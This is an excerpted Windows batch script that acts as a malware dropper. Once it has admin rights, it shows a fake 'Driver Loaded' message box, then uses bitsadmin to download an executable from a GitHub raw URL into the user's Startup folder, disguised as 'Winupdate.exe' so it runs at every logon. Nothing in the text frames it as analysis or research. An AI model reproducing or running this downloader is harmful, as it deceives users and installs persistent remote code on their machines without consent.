...
:gotAdmin
echo msgbox "Driver Loaded - Press OK to Continue" > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs
...
bitsadmin /transfer Packages /download /priority foreground https://github.com/HSNSBBH4/idk/raw/main/Turbo.exe "C:\Users\beney\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
